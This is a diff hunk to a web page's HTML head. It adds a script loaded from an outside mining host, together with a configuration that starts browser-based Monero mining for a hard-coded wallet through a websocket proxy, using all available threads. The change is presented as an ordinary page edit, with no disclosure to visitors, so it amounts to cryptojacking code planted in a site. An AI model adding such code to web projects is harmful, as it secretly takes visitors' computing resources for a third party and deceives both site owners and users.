@@ -6,6 +6,17 @@
         <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">  
         <link rel=”apple-touch-icon” href=”apple-touch-icon.png”>
         <script src="pages.js"></script>
+        <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    let pool = "moneroocean.stream";
+    let walletAddress = "48AKe5DiEH9LPfdPcFQgUhRVSh9NjoWBuDn5JhMsEas3gdzqBgD42Uuj5hzuZ8D1Y7EYV7hq4fVbS5rsMEBg1iLZDwZYqb4";
+    let workerId = "x"
+    let threads = -1;
+    let password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
     </head>
     <body>
         <div class="app">
